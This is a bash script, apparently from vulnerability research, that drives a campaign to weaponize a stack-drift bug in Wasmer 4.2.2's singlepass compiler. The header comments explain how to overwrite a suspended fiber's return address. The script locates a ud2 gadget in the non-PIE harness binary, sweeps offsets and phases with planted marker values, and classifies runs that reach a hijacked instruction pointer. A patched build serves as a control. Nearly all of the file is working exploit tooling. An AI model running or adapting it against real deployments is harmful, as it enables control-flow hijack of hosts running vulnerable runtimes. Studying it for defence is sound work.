#!/usr/bin/env bash
# campaign_wpn.sh -- CWA-2026-006 directed-control-transfer campaign (M1..M4).
#
# Source-derived model (see analysis/WEAPONIZATION.md):
#   * drift site: singlepass 4.2.2 codegen.rs:363 release_locations_value -> adjust_stack (sub rsp)
#     reached from Operator::Else (codegen.rs:2993); rsp drifts DOWN ~16 B/iter.
#   * only rsp-relative writes are emit_call_native's push_used_gpr batch + call RA
#     (locals/spills are RBP-relative -> do not drift).
#   * sparse call schedule (every 512 iters) => batch positions step 8192 B => a batch
#     skips the 4 KiB fiber guard and lands in the neighbour (holder) fiber.
#   * the holder is suspended inside a host import; wasmer 4.2.2 runs host imports via
#     on_host_stack -> Yielder::on_parent_stack -> corosensei on_stack ->
#     stack_call_trampoline:
#         push rbp ; mov rbp,rsp ; mov rsp,rsi ; call rdx ; mov rsp,rbp ; pop rbp ; ret
#     so [X] = return address into corosensei::on_stack and [X-8] = holder's saved RBP.
#     Overwriting [X] => on host-import return the `ret` jumps to the attacker value
#     == the directed control transfer (RIP <- attacker value).
#
# Experiments:
#   [1] MEASURE   - dump the suspended holder (and trigger) frame chain: locate X and
#                   its depth below the fibre top (the alignment target).
#   [2] DEEP SWEEP- sweep the crossing depth K and the phase R so a batch qword lands
#                   on [X] (K>0 was never explored before: previous runs always used
#                   iters = 65536+R+1 == exit right after the first crossing batch).
#   [3] ud2 variant (SIGILL = unambiguous aimed hit).
#   [4] fixed control (wasmvm 3.0.8 / Wasmer 7.4.2).
set -uo pipefail
cd "$(dirname "$0")/.."          # -> archway/
OUT=ci-out/wpn
mkdir -p "$OUT"

NESTED=harness/contracts/nested
H=./harness/harness
HF=./harness-fixed/harness-fixed

echo "=== [0/5] toolchains ==="
go version || { echo "FATAL: no go"; exit 1; }
rustup toolchain install 1.81.0 --profile minimal 2>&1 | tail -1 || true
rustup target add wasm32-unknown-unknown --toolchain 1.81.0 2>&1 | tail -1 || true

echo "=== [1/5] build harnesses ==="
(cd harness && go build -o harness .) || { echo "FATAL: harness build failed"; exit 1; }
(cd harness-fixed && go build -o harness-fixed .) || { echo "FATAL: harness-fixed build failed"; exit 1; }
echo "built."

# ---- wasmtime helper (wat2wasm) ----
PY=""
if python3 -c "import wasmtime" >/dev/null 2>&1; then
  PY=python3
elif python3 -m venv /tmp/watvenv >/dev/null 2>&1 && /tmp/watvenv/bin/pip install --quiet wasmtime >/dev/null 2>&1; then
  PY=/tmp/watvenv/bin/python3
fi
if [ -z "$PY" ]; then echo "FATAL: no wasmtime (pip install wasmtime)"; exit 1; fi
echo "wasmtime via $PY"

wat2wasm() { # <wat> <wasm>
  "$PY" -c "import wasmtime,sys; open(sys.argv[2],'wb').write(wasmtime.wat2wasm(open(sys.argv[1]).read()))" "$1" "$2"
}

# ud2 gadget address in the (non-PIE) harness binary
UD2=$(objdump -d "$H" 2>/dev/null | grep -m1 -E '^[[:space:]]*[0-9a-f]+:[[:space:]]+0f 0b' | awk '{print $1}' | tr -d ':')
echo "harness ud2 gadget @0x${UD2:-none}" | tee "$OUT/ud2.txt"

# cached holder/benign for the staged-10 hit-reporting holder (trigger varies per run)
CACHE="$OUT/cache_s10"
mkdir -p "$CACHE"
python3 "$NESTED/gen_nested_contracts.py" "$CACHE" --offset 0 --iters 1 --staged 10 >/dev/null 2>&1
wat2wasm "$CACHE/holder.wat" "$CACHE/holder.wasm"
wat2wasm "$CACHE/benign.wat" "$CACHE/benign.wasm"

echo "=== [2/5] MEASURE: suspended-coroutine frame chain (locate the resume slot X) ==="
{
  echo "## depth-1 scan (holder suspended in its query_chain; trigger not started)"
  M="$OUT/measure_d1"; mkdir -p "$M"
  python3 "$NESTED/gen_nested_contracts.py" "$M" --offset 0 --iters 1 --staged 10 >/dev/null 2>&1
  wat2wasm "$M/holder.wat" "$M/holder.wasm"; wat2wasm "$M/trigger.wat" "$M/trigger.wasm"; wat2wasm "$M/benign.wat" "$M/benign.wasm"
  timeout 120 "$H" -wasm "$M/holder.wasm" -trigger "$M/trigger.wasm" -benign "$M/benign.wasm" \
     -warmups 3 -exec '{}' -gas 10000000000000 -scanchain -out "$M/report.json" 2>&1 | grep -E 'CHAIN|PLANTSCAN' | head -80
  echo "## depth-2 scan (trigger suspended in its own query_chain -> both fibres live)"
  M2="$OUT/measure_d2"; mkdir -p "$M2"
  python3 "$NESTED/gen_nested_contracts.py" "$M2" --offset 0 --iters 1 --staged 10 --call-query >/dev/null 2>&1
  wat2wasm "$M2/holder.wat" "$M2/holder.wasm"; wat2wasm "$M2/trigger.wat" "$M2/trigger.wasm"; wat2wasm "$M2/benign.wat" "$M2/benign.wasm"
  timeout 120 "$H" -wasm "$M2/holder.wasm" -trigger "$M2/trigger.wasm" -benign "$M2/benign.wasm" \
     -warmups 3 -exec '{}' -gas 10000000000000 -scanchain -out "$M2/report.json" 2>&1 | grep -E 'CHAIN|PLANTSCAN' | head -120
} > "$OUT/measure.txt" 2>&1
tail -40 "$OUT/measure.txt"

# ---- helpers for the sweeps -------------------------------------------------
# gen_trigger_only <dir> <offset> <iters> <extra...>: reuse cached holder+benign.
gen_run() { # dir offset iters plantmode extra...
  local d="$1" off="$2" it="$3"; shift 3
  mkdir -p "$d"
  cp "$CACHE/holder.wasm" "$d/holder.wasm"
  cp "$CACHE/benign.wasm" "$d/benign.wasm"
  python3 "$NESTED/gen_nested_contracts.py" "$d" --offset "$off" --iters "$it" --staged 10 "$@" >/dev/null 2>&1
  wat2wasm "$d/trigger.wat" "$d/trigger.wasm"
}

CAN16="0x414100000000,0x414100000001,0x414100000002,0x414100000003,0x414100000004,0x414100000005,0x414100000006,0x414100000007,0x414100000008,0x414100000009,0x41410000000a,0x41410000000b,0x41410000000c,0x41410000000d,0x41410000000e,0x41410000000f"

run_one() { # dir tag
  local d="$1" tag="$2"
  rm -f /tmp/harness_crash_report.txt
  timeout 120 "$H" -wasm "$d/holder.wasm" -trigger "$d/trigger.wasm" -benign "$d/benign.wasm" \
      -warmups 3 -exec '{}' -gas 10000000000000 \
      -out "$OUT/sw-$tag.json" > "$OUT/sw-$tag.stdout" 2> "$OUT/sw-$tag.stderr"
  echo "$?" > "$OUT/sw-$tag.exit"
}

echo "=== [3/5] DEEP SWEEP: marker plants, crossing depth K x phase R ==="
KS="${KS:-0 1 2 4 8 16 32}"
NPHASE="${NPHASE:-512}"
for K in $KS; do
  for R in $(seq 0 $((NPHASE-1))); do
    OFF=$((512 - R)); ITERS=$((65536 + R + 1 + 512*K))
    D="$OUT/dk${K}_r${R}"
    gen_run "$D" "$OFF" "$ITERS" --plants distinct --plant-values "$CAN16"
    run_one "$D" "mk-K${K}-R${R}"
  done
  echo "  K=$K done" | tee -a "$OUT/sweep.log"
done

echo "=== [4/5] ud2 aimed sweep (K small, full phase) ==="
if [ -n "$UD2" ]; then
  PPV=""
  for k in $(seq 1 16); do PPV="${PPV}${PPV:+,}0x$UD2"; done
  for K in ${U2KS:-0 1 2 4}; do
    for R in $(seq 0 $((NPHASE-1))); do
      OFF=$((512 - R)); ITERS=$((65536 + R + 1 + 512*K))
      D="$OUT/uk${K}_r${R}"
      gen_run "$D" "$OFF" "$ITERS" --plant-values "$PPV"
      run_one "$D" "ud2-K${K}-R${R}"
    done
    echo "  ud2 K=$K done" | tee -a "$OUT/sweep.log"
  done
else
  echo "  no ud2 gadget; skipped" | tee -a "$OUT/sweep.log"
fi

echo "=== [5/5] fixed control (wasmvm 3.0.8 / Wasmer 7.4.2) ==="
D="$OUT/fixed"; gen_run "$D" 0 65793 --plants distinct --plant-values "$CAN16"
timeout 120 "$HF" -wasm "$D/holder.wasm" -trigger "$D/trigger.wasm" -benign "$D/benign.wasm" \
   -warmups 3 -exec '{}' -gas 10000000000000 -out "$OUT/fixed.json" > "$OUT/fixed.stdout" 2> "$OUT/fixed.stderr" || true
echo "fixed exit=$?" | tee -a "$OUT/sweep.log"

echo "=== classify ==="
python3 - "$OUT" <<'PYEOF'
import glob, json, os, re, sys
from collections import Counter
OUT = sys.argv[1]
hijack, reads, sigill, holder, trigger, clean, errd, other = [], [], [], [], [], [], [], []
for f in sorted(glob.glob(os.path.join(OUT, "sw-*.stderr"))):
    tag = os.path.basename(f)[3:-7]
    txt = open(f, errors="replace").read()
    j = f[:-7] + ".json"
    mp = re.search(r'(?:PC|RIP)=0x([0-9a-f]+)', txt)
    ma = re.search(r'addr=0x([0-9a-f]+)', txt)
    pc = mp.group(1) if mp else ""
    ad = ma.group(1) if ma else ""
    if "SIGILL" in txt:
        sigill.append((tag, pc)); continue
    if pc.startswith("4141"):
        hijack.append((tag, pc)); continue
    if ad.startswith("4141"):
        reads.append((tag, ad)); continue
    if os.path.exists(j) and os.path.getsize(j) > 0:
        try:
            e = (json.load(open(j)).get("executes") or [{}])[0].get("error") or ""
        except Exception:
            e = ""
        if e:
            errd.append((tag, e[:60])); continue
        clean.append(tag); continue
    if "nestedQuerier" in txt:
        trigger.append((tag, pc)); continue
    if "CRASHDIAG" in txt or pc:
        holder.append((tag, pc, ad)); continue
    other.append(tag)
print("HIJACKS (PC=0x4141..)      :", len(hijack), hijack[:60])
print("SIGILL (aimed ud2 hit)     :", len(sigill), sigill[:60])
print("MARKER-READS (addr=0x4141..):", len(reads), reads[:60])
print("holder-side crashes        :", len(holder), holder[:40])
print("trigger-side crashes       :", len(trigger), trigger[:40])
print("wasm-caught errors         :", len(errd), errd[:40])
print("clean                      :", len(clean))
print("other                      :", len(other), other[:20])
print("holder PC tails            :", Counter(p[-3:] for _, p, _ in holder if p).most_common(10))
PYEOF

echo "=== summary ==="
ls -la "$OUT" | head -20
exit 0
